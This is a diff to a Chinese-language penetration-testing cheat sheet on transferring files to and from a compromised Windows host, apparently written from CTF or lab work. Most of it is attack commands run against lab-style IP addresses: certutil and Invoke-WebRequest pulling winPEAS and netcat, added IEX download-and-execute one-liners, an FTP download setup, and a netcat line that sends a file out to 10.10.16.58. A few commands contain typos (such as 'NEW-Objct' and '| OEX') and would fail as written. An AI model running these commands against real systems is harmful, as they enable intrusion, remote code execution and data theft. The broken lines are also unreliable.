@@ -20,7 +20,7 @@ tags:
 
 ### 传入文件
 
-### Certutil
+#### Certutil
 
 ```bash
 *Evil-WinRM* PS C:\programdata\apps> certutil.exe -urlcache -split -f "http://10.10.16.155:8000/winPEASx64.exe" .
@@ -32,7 +32,7 @@ tags:
 CertUtil: -URLCache command completed successfully.
 ```
 
-### Impacket-smbserver
+#### Impacket-smbserver
 
 在要共享的文件夹下创建共享目录。
 
@@ -76,10 +76,54 @@ dir
                2 Dir(s)   4,617,351,168 bytes free
 ```
 
-### Invoke-WebRequest
+#### Invoke-WebRequest
 
 ```bash
 Invoke-WebRequest -Uri 'http://10.10.16.58/nc.exe' -OutFile 'C:\Utils\nc.exe'
+```
+
+#### Net.WebClient
+
+```bash
+(New-Object Net.WebClient).DownloadFile('<URL>','Output File Name')
+```
+
+```bash
+(New-Object Net.WebClient).DownloadFileAsync('<URL>','Output File Name')
+```
+
+#### IEX
+
+```bash
+IEX(NEW-Objct Net.WebClient).DownloadString('<URL>')
+```
+
+```bash
+(NEW-Objct Net.WebClient).DownloadString('<URL>') | IEX
+```
+
+```bash
+Invoke-WebRequest -Uri 'http://10.10.16.58/nc.exe' -OutFile 'C:\Utils\nc.exe' -UseBasicParsing | OEX
+```
+
+#### FTP 下载
+
+需要 Python3 的模块 `pyftpdlib`。
+
+```bash
+sudo pip3 install pyftpdlib
+```
+
+搭建 FTP 服务器。
+
+```bash
+sudo python3 -m pyftpdlib --port 21
+```
+
+在 Windows 中下载文件。
+
+```bash
+(New-Object Net.WebClient).DownloadFile('ftp://10.10.16.58/test.txt','C:\programdata\apps\test.txt')
 ```
 
 ### 传出文件
@@ -87,7 +131,6 @@ Invoke-WebRequest -Uri 'http://10.10.16.58/nc.exe' -OutFile 'C:\Utils\nc.exe'
 ```bash
 download
 ```
-
 
 ```bash
 PS C:\Utils> cmd /c "C:\Utils\nc64.exe 10.10.16.58 408 < C:\Utils\out.txt"
